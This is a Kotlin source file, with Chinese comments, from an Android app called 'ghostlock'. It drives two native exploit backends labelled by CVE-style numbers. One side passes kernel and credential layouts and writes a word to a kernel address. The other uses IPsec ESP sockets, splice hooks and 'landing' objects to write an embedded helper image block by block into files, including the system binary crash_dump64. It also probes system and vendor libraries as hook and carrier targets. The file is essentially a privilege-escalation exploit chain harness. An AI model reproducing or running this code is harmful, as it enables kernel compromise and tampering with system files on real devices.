package com.ghostlock.app.tempui

import com.ghostlock.app.core.generated.CredentialLayout43499
import com.ghostlock.app.core.generated.FinishVictim43499
import com.ghostlock.app.core.generated.HookPlanRequest43284
import com.ghostlock.app.core.generated.Init43284
import com.ghostlock.app.core.generated.ModuleCheck43284
import com.ghostlock.app.jni.cve43284.Assembled43284
import com.ghostlock.app.jni.cve43499.Assembled43499
import com.ghostlock.app.core.generated.Wait43284

import com.ghostlock.app.core.generated.Init43499
import com.ghostlock.app.core.generated.KernelLayout43499
import com.ghostlock.app.core.generated.Prepare43499
import com.ghostlock.app.core.generated.TargetOffsets43499
import com.ghostlock.app.core.generated.WordWrite43499
import com.ghostlock.app.jni.cve43284.Native43284
import com.ghostlock.app.jni.cve43499.Native43499
import com.ghostlock.app.log.GhostLog

/**
 * 新函数面的真机探针（D2 装配的门禁）。
 *
 * 它证明的是"**新库能被 Kotlin 调用**"这件事，逐项如下：
 *  1. 两个库各自加载成功（一个 backend 一个库）；
 *  2. create 给出正句柄；initialize 接受生成的 DTO（43499 四组）并按名回答；
 *  3. snapshot 回来的是**具名**数组（名字由 native 的 snapshotFields 导出，不手抄）；
 *  4. 没有设备 device hook 的调用一律**具名拒绝**（op-not-wired:<函数名>）；
 *  5. shutdown / destroy 走通，销毁后句柄作废（stale-handle）。
 *
 * 参数用哨兵值（占位）：真实 profile 仍在设计（本阶段目标到 J7 为止），所以这里只求"值能一路
 * 走到该到的地方"，不求它们是这一台机器的真值。
 */
object TypedBackendProbe {
    /** 探针日志的 logcat 标签。 */
    const val TAG = "GhostlockTyped"

    /** 跑两个 backend 的探针。@return 每一行（屏幕与 logcat 相同）。 */
    /** 探针拿到的 Context：建 SA（IpSecManager）要用它。 */
    @Volatile
    private var probeContext: android.content.Context? = null

    fun run(context: android.content.Context): List<String> {
        probeContext = context
        val lines = mutableListOf<String>()
        fun step(line: String) {
            lines += line
            GhostLog.i(TAG, line)
        }
        probe43499(::step)
        probe43284(::step)
        return lines
    }

    private fun probe43499(step: (String) -> Unit) {
        if (!Native43499.ensureLoaded()) {
            step("typed: 43499 library missing (lib" + Native43499.LIBRARY + ".so)")
            return
        }
        step("typed: 43499 library loaded")
        val refusal = arrayOf("")
        val handle = Native43499.create()
        if (handle <= 0) {
            step("typed: 43499 create failed")
            return
        }
        step("typed: 43499 create ok")

        val names = Native43499.snapshotFields()
        val snapshot = LongArray(names.size)
        var code = Native43499.initialize(
            handle, init43499(), layout43499(), credential43499(), targets43499(), refusal,
        )
        step("typed: 43499 initialize code=" + code + " refusal=" + refusal[0])

        code = Native43499.snapshot(handle, snapshot, refusal)
        step(
            "typed: 43499 snapshot code=" + code + " " +
                names.indices.joinToString(",") { names[it] + "=" + snapshot[it] },
        )

        val out = LongArray(names.size)
        code = Native43499.prepare(handle, prepare43499(), out, refusal)
        step("typed: 43499 prepare code=" + code + " refusal=" + refusal[0])

        code = Native43499.writeWord(handle, write43499(), refusal)
        step("typed: 43499 writeWord code=" + code + " refusal=" + refusal[0])

        code = Native43499.finishVictim(handle, FinishVictim43499(0, 0L), out, refusal)
        step("typed: 43499 finishVictim code=" + code + " refusal=" + refusal[0])

        code = Native43499.shutdown(handle, refusal)
        step("typed: 43499 shutdown code=" + code + " refusal=" + refusal[0])
        code = Native43499.destroy(handle, refusal)
        step("typed: 43499 destroy code=" + code + " refusal=" + refusal[0])
        code = Native43499.shutdown(handle, refusal)
        step("typed: 43499 shutdown-after-destroy code=" + code + " refusal=" + refusal[0])
    }

    private fun probe43284(step: (String) -> Unit) {
        if (!Native43284.ensureLoaded()) {
            step("typed: 43284 library missing (lib" + Native43284.LIBRARY + ".so)")
            return
        }
        step("typed: 43284 library loaded")
        val refusal = arrayOf("")
        val handle = Native43284.create()
        if (handle <= 0) {
            step("typed: 43284 create failed")
            return
        }
        step("typed: 43284 create ok")

        var code = Native43284.initialize(handle, init43284(), refusal)
        step("typed: 43284 initialize code=" + code + " refusal=" + refusal[0])

        val snapshot = LongArray(6)
        code = Native43284.snapshot(handle, snapshot, refusal)
        step(
            "typed: 43284 snapshot code=" + code +
                " " + Native43284.snapshotFields().indices.joinToString(",") { index ->
                    Native43284.snapshotFields()[index] + "=" + snapshot[index]
                },
        )

        /* 本构建自带的两张图与钩子计划：数据性的那部分，D2 已经接线，所以这里必须是 ok。 */
        val image = Native43284.embeddedImage(handle, 0, refusal)
        step(
            "typed: 43284 embeddedImage code=" + (if (image == null) "null" else "ok") +
                " size=" + (image?.size ?: -1) + " refusal=" + refusal[0],
        )
        val hook = LongArray(4)
        val hookRequest = HookPlanRequest43284(
            ByteArray(16) { 0x11 }, "splice".toByteArray(), 0,
        )
        code = Native43284.hookPlan(handle, hookRequest, hook, refusal)
        step("typed: 43284 hookPlan code=" + code + " words=" + hook.joinToString(",") + " refusal=" + refusal[0])

        /* 模块校验：已经**接线**（纯计算）。用一段假字节 ⇒ 必须具名拒绝，不冒充成功。 */
        val moduleCheck = ModuleCheck43284(
            moduleImage = ByteArray(64) { 0x7F },
            kernelVermagic = "5.15.189-android13".toByteArray(),
        )
        code = Native43284.moduleCheck(handle, moduleCheck, refusal)
        step("typed: 43284 moduleCheck code=" + code + " refusal=" + refusal[0])

        /* 等终态：已经**接线**（marker 轮询）。给一个不存在的路径 ⇒ 预算内一直是 inflight。 */
        val terminal = LongArray(1)
        val wait = Wait43284(
            budgetMs = 40L,
            pollMs = 10L,
            successMarker = "ghostlock-ok".toByteArray(),
            failureMarker = "ghostlock-failed".toByteArray(),
            inFlightMarker = "ghostlock-running".toByteArray(),
            moduleMarker = "ghostlock".toByteArray(),
            moduleName = "/data/local/tmp/ghostlock-wait-probe".toByteArray(),
        )
        code = Native43284.waitTerminal(handle, wait, terminal, refusal)
        step(
            "typed: 43284 waitTerminal code=" + code + " state=" + terminal[0] +
                " refusal=" + refusal[0],
        )

        /* 门：真的以 O_RDWR 打开一个本应用可写的文件（用自身的缓存目录），再看一个不存在的路径。 */
        /*
         * 门的目标：优先用设备上那份**一次性载体**（16 KiB、world-writable，退役链当年就用它），
         * 因为 ESP 写需要「旧块内容」才能组出向量 —— 16 字节的小文件写到第二块就没有旧块了（NoOldBlock）。
         * 退路才是应用自己的缓存目录里的自建文件。
         */
        val sharedCarrier = java.io.File("/data/local/tmp/ghostlock-carrier")
        val doorPath = if (sharedCarrier.canRead() && sharedCarrier.canWrite() && sharedCarrier.length() >= 4096L) {
            sharedCarrier
        } else {
            java.io.File(System.getProperty("java.io.tmpdir") ?: "/data/local/tmp", "ghostlock-door-probe").apply {
                writeBytes(ByteArray(16) { 0x5A })
            }
        }
        val ticket = LongArray(1)
        code = Native43284.resolveTarget(
            handle,
            com.ghostlock.app.core.generated.ResolveTarget43284(
                role = 1, path = doorPath.absolutePath.toByteArray(), accessMode = 0,
            ),
            ticket,
            refusal,
        )
        step("typed: 43284 resolveTarget code=" + code + " ticket=" + ticket[0] + " refusal=" + refusal[0])

        /* 读回一块：走门那扇 fd 的 pread（设备工作）。文件里是刚写的十六个 0x5A。 */
        val block = ByteArray(16)
        code = Native43284.readBlock(
            handle,
            com.ghostlock.app.core.generated.ReadBlock43284(ticket = ticket[0], offset = 0L),
            block,
            refusal,
        )
        step(
            "typed: 43284 readBlock code=" + code + " bytes=" +
                block.joinToString("") { byte -> "%02x".format(byte) } + " refusal=" + refusal[0],
        )

        /* patch1 via Kotlin：取本构建的 helper 镜像，按十六字节切块，逐块写进载体的开头。
           这一段的逻辑全在 Kotlin 侧（镜像来源、切块、偏移、顺序），native 只提供「取镜像」与「写一块」。 */
        var written = 0
        var refusedAt = -1
        val helper = Native43284.embeddedImage(handle, 0, refusal)
        if (helper == null) {
            step("typed: 43284 patch1-via-kotlin no-helper refusal=" + refusal[0])
        } else {
            var offset = 0L
            while (offset < helper.size) {
                val remaining = helper.size - offset.toInt()
                val width = if (remaining >= 16) 16 else remaining
                val chunk = helper.copyOfRange(offset.toInt(), offset.toInt() + width).copyOf(16)
                code = Native43284.writeBlock(
                    handle,
                    com.ghostlock.app.core.generated.WriteBlock43284(
                        ticket = ticket[0], offset = offset, block = chunk,
                    ),
                    refusal,
                )
                if (code != 0) {
                    refusedAt = offset.toInt()
                    break
                }
                written += 1
                offset += 16L
            }
            step("typed: 43284 patch1-via-kotlin blocks=" + written + " refusedAt=" + refusedAt)
            /* 回读第一块，看内容是不是真的落上了。 */
            val back = ByteArray(16)
            code = Native43284.readBlock(
                handle,
                com.ghostlock.app.core.generated.ReadBlock43284(ticket = ticket[0], offset = 0L),
                back,
                refusal,
            )
            code = Native43284.snapshot(handle, snapshot, refusal)
            step(
                "typed: 43284 patch1-readback code=" + code + " first16=" +
                    back.joinToString("") { byte -> "%02x".format(byte) } +
                    " writes=" + snapshot[4] + " flags=" + snapshot[1],
            )
        }

        /* 写一块：走落地对象（ESP 路线）。写成功只到 Dispatched；随后读回比较一致才会 Applied。 */
        code = Native43284.writeBlock(
            handle,
            com.ghostlock.app.core.generated.WriteBlock43284(
                ticket = ticket[0], offset = 0L, block = ByteArray(16) { 0x33 },
            ),
            refusal,
        )
        step("typed: 43284 writeBlock code=" + code + " refusal=" + refusal[0])
        code = Native43284.snapshot(handle, snapshot, refusal)
        step(
            "typed: 43284 snapshot-after-write code=" + code +
                " " + Native43284.snapshotFields().indices.joinToString(",") { index ->
                    Native43284.snapshotFields()[index] + "=" + snapshot[index]
                },
        )

        val badTicket = LongArray(1)
        code = Native43284.resolveTarget(
            handle,
            com.ghostlock.app.core.generated.ResolveTarget43284(
                role = 2, path = "/no/such/door".toByteArray(), accessMode = 0,
            ),
            badTicket,
            refusal,
        )
        step("typed: 43284 resolveTarget(bad) code=" + code + " refusal=" + refusal[0])
        code = Native43284.trigger(handle, com.ghostlock.app.core.generated.Trigger43284(150L), refusal)
        step("typed: 43284 trigger code=" + code + " refusal=" + refusal[0])

        code = Native43284.shutdown(handle, refusal)
        step("typed: 43284 shutdown code=" + code + " refusal=" + refusal[0])
        code = Native43284.destroy(handle, refusal)
        step("typed: 43284 destroy code=" + code + " refusal=" + refusal[0])

        probeAssembled43284(step, doorPath.absolutePath)

        /* 43499 侧最小序列：建会话 → 按 route 取访问对象（1/2/3 都试，看工厂接受哪个）→ 收尾。 */
        val handle43499 = Native43499.create()
        if (handle43499 <= 0) {
            step("typed: assembled 43499 create failed")
        } else {
            val assembled43499 = Assembled43499(handle43499)
            for (route in 1..3) {
                val access43499 = assembled43499.openAccess(route)
                step(
                    "typed: assembled 43499 route=" + route + " access=" + access43499 +
                        " refusal=" + assembled43499.lastRefusal,
                )
            }
            step("typed: assembled 43499 close=" + assembled43499.close())
        }
    }

    /** 43284 的哨兵参数（顺序与字段名由 D1 单表定；真实 profile 仍待设计）。 */
    private fun init43284() = Init43284(
        spi = 0x1234,
        encapPort = 4500,
        /* 发送端口 0 = 让内核挑临时端口（真机实测：指定端口在应用进程里绑不上，临时端口可以）。 */
        senderPort = 0,
        icvLength = 16,
        aesKey = ByteArray(32) { 0xA5.toByte() },
        hmacKey = ByteArray(32) { 0x5A.toByte() },
        initialSequence = 1,
        sequencePresent = true,
    )

    private fun resolve43284() = com.ghostlock.app.core.generated.ResolveTarget43284(
        role = 1,
        path = "/system/lib64/libc++.so".toByteArray(),
        accessMode = 0,
    )

    /**
     * 用 Assembled43284 走一遍最小闭环（独立会话）：建 → 初始化 → 开门 → 读块 → 收尾。
     *
     * 这一段刻意只用**包装类**（拼装在 Kotlin），native 侧一行未改 —— 它验证的是包装类本身可用。
     */
    private fun probeAssembled43284(step: (String) -> Unit, doorPath: String) {
        if (!Native43284.ensureLoaded()) {
            step("typed: assembled 43284 library missing")
            return
        }
        val handle = Native43284.create()
        if (handle <= 0) {
            step("typed: assembled 43284 create failed")
            return
        }
        val session = Assembled43284(handle)
        session.initialize(init43284())
        step("typed: assembled 43284 init code=" + session.lastCode)
        val ticket = session.openTarget(doorPath, Assembled43284.ROLE_PATCH1)
        step("typed: assembled 43284 open code=" + session.lastCode + " ticket=" + ticket)
        val block = if (ticket != 0L) session.readBlock(ticket, 0L) else null
        step(
            "typed: assembled 43284 read bytes=" +
                (block?.joinToString("") { byte -> "%02x".format(byte) } ?: "none") +
                " refusal=" + session.lastRefusal,
        )
        /* 分步拼装（拼装顺序写在 Kotlin 里）：开门 → socket → 拼接面 → 落地 → 拉起 → 收尾。 */
        val stepwiseHandle = Native43284.create()
        val stepwise = Assembled43284(stepwiseHandle) { init43284() }
        stepwise.initialize(init43284())
        val stepTarget = stepwise.openTargetStepwise(doorPath)
        step("typed: stepwise 43284 open target=" + stepTarget + " refusal=" + stepwise.lastRefusal)
        val stepSocket = stepwise.openEspSocket()
        step("typed: stepwise 43284 socket=" + stepSocket + " refusal=" + stepwise.lastRefusal)
        val stepSurface = stepwise.buildSurface()
        step("typed: stepwise 43284 surface=" + stepSurface + " refusal=" + stepwise.lastRefusal)
        val stepLanding = stepwise.buildLanding()
        step("typed: stepwise 43284 landing=" + stepLanding + " refusal=" + stepwise.lastRefusal)
        /* 路 B：不单独 bringUp —— Access::initialize 自己会拉起（见计划 §11.32）。 */
        step("typed: stepwise 43284 bringUp=skipped-path-b")
        /* 经落地对象写 helper 镜像：这是「写目标在 Kotlin」的真机第一次尝试。 */
        val landed = stepwise.writeHelperThroughLanding()
        val back = stepwise.readLandingFirstBlock()
        step(
            "typed: stepwise 43284 landed=" + landed + " back=" +
                (back?.joinToString("") { byte -> "%02x".format(byte) } ?: "none") +
                " refusal=" + stepwise.lastRefusal,
        )
        /* 驱动器里 patch#1 的完整序列：建 Access → 初始化 → 写 helper 镜像（image=helper/offset=0/width=16）。 */
        val stepAccess = stepwise.buildAccess()
        step("typed: stepwise 43284 access=" + stepAccess + " refusal=" + stepwise.lastRefusal)

        /*
         *  只读取证（纯 Kotlin，不需要任何 native 改动）：在我们 app **自己的 uid** 下，
         *  这些目标能不能只读打开 —— 这是「从 app uid 起链」的第一批事实。
         *
         *  判读：exists 假 ⇒ 连看都看不到；exists 真而 canRead 假 ⇒ 被 SELinux 拒读，
         *  那一步就得换开发载体，或改由 LKM 阶段承担。
         */
        for (path in listOf(
            /* hook 目标候选（sentry 模式所在库） */
            "/system/lib64/libc++.so",
            "/system/lib64/libutils.so",
            "/system/lib64/libbinder.so",
            /* patch#1 的 helper */
            "/apex/com.android.runtime/bin/crash_dump64",
            /* 载体候选：dirtyfrag 选的那四个 vendor 库 + 我们的开发载体 */
            "/vendor/lib64/libbinderdebug.so",
            "/vendor/lib64/libstagefrighthw.so",
            "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
            "/vendor/lib64/libbsp_module.so",
            "/data/local/tmp/ghostlock-carrier",
        )) {
            val file = java.io.File(path)
            val exists = file.exists()
            val canRead = file.canRead()
            val osAccess = runCatching { android.system.Os.access(path, android.system.OsConstants.R_OK) }
            val opened = runCatching {
                java.io.FileInputStream(file).use { stream -> stream.read() }
                "open=ok"
            }.getOrElse { problem -> "open=" + problem.javaClass.simpleName + ":" + (problem.message ?: "") }
            step(
                "typed: readable " + path + " exists=" + exists + " canRead=" + canRead +
                    " osAccess=" + osAccess.getOrElse { "throw" } + " " + opened +
                    " size=" + (if (exists) file.length() else -1L),
            )
        }
        val accessParams = Assembled43284.fullAccessParams(doorPath)
        val accessInit = stepwise.initializeAccessAndRemember(accessParams, init43284())
        step("typed: stepwise 43284 accessInit=" + accessInit + " refusal=" + stepwise.lastRefusal)
        val helperForImage = stepwise.image(Assembled43284.ROLE_IMAGE_SPLICE_HELPER)
        val patch1Wrote = if (helperForImage != null) stepwise.writeImage(helperForImage, 0L, 16L, init43284()) else false
        step("typed: stepwise 43284 patch1 wrote=" + patch1Wrote + " refusal=" + stepwise.lastRefusal)
        step("typed: stepwise 43284 accessDestroy=" + stepwise.destroyAccessNow())

        /*
         *  patch#1（helper 步骤）：为 crash_dump64 单开**第二个实例**（目标由 Kotlin 决定），
         *  用 embeddedImage(0) 的 helper 字节按 16 B 块写进去；writeImage 内部逐块回读比对，
         *  正好就是上游那条「写 + 校验」语义（短读=verify skipped，不符=VerifyMismatch）。
         *
         *  判读：wrote=true ⇒ 我们自己的字节真的写进了系统文件；否则看 refusal（具名）。
         */
        val patchTarget = "/apex/com.android.runtime/bin/crash_dump64"
        val patcher = Assembled43284(Native43284.create()) { init43284() }
        step("typed: patch1 door=" + patcher.openTargetStepwise(patchTarget))
        patcher.openEspSocket()
        step("typed: patch1 surface=" + patcher.buildSurface())
        step("typed: patch1 landing=" + patcher.buildLanding())
        step("typed: patch1 access=" + patcher.buildAccess())
        val patchParams = Assembled43284.fullAccessParams(patchTarget)
        step("typed: patch1 init=" + patcher.initializeAccessAndRemember(patchParams, init43284()) +
            " refusal=" + patcher.lastRefusal)
        val helperForPatch = patcher.image(Assembled43284.ROLE_IMAGE_SPLICE_HELPER)
        val patchWrote = if (helperForPatch != null) patcher.writeImage(helperForPatch, 0L, 16L, init43284()) else false
        step("typed: patch1 wrote=" + patchWrote + " refusal=" + patcher.lastRefusal +
            " helperBytes=" + (helperForPatch?.size ?: -1))
        step("typed: patch1 accessDestroy=" + patcher.destroyAccessNow())
        step("typed: patch1 teardown=" + patcher.tearDown())
        val stepSeq = stepwise.nextSequence()
        step("typed: stepwise 43284 sequence=" + stepSeq)
        val stepTorn = stepwise.tearDown()
        step("typed: stepwise 43284 tearDown=" + stepTorn + " refusal=" + stepwise.lastRefusal)
        step("typed: stepwise 43284 destroy=" + Native43284.destroy(stepwiseHandle, arrayOf("")))
        val closed = session.close()
        step("typed: assembled 43284 close ok=" + closed)
    }

    /* ---- 43499 的哨兵参数（顺序＝D1 单表的顺序；只求值能走到该到的地方） ---- */

    private fun init43499() = Init43499(
        1L, 2, 1, 96L, 48L, 56L, 264L, 4L, 7L, 0L, 150L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0, 0,
        false, 0L, 0L, false, 4096L, false, 0L, 12L,
    )

    private fun layout43499() = KernelLayout43499(
        0x1111L, 0x2222L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L,
        0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0x3333L, 0L, 0L, 0L, 8,
    )

    private fun credential43499() = CredentialLayout43499(
        176L, 0L, 256L, 48L, 3L, 2199023255551L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 4,
    )

    private fun targets43499() = TargetOffsets43499(
        47885704L, 0L, true, 4, 0L, 0L, false, 0, 0L, 0L, false, 0, 0L, 0L, false, 0,
        2144L, 0L, false, 4,
    )

    private fun prepare43499() = Prepare43499(
        4L, 3L, 0L, 0L, 0L, 0L, 0L, 4L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 4096L, 0x200000L, 512L,
        1024L, 0L, 0, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 64L, 0L, false, 0L, 0L, 0L, 0L, 0L,
    )

    private fun write43499() = WordWrite43499(
        /* 直接量超出 Long 范围：按无符号写再转回来（内核直接映射里的高地址就是这样）。 */
        0xFFFF888000001000uL.toLong(), 0L, 1, 0L, false, 0L, 0L, 0L, false,
    )
}
